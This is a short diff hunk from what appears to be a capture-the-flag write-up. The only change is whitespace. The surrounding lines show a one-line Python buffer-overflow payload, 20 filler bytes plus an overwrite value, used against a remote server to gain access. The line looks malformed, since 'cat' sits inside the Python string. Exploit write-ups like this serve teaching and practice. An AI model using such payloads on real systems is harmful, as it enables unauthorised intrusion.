@@ -29,7 +29,7 @@ When we run this payload with the remote server, we can get access to the local 
 python -c 'print("A"*20+"\xee\xba\xf3\xca" ; cat)'
 ```
 
-
+  
 
 ---
 
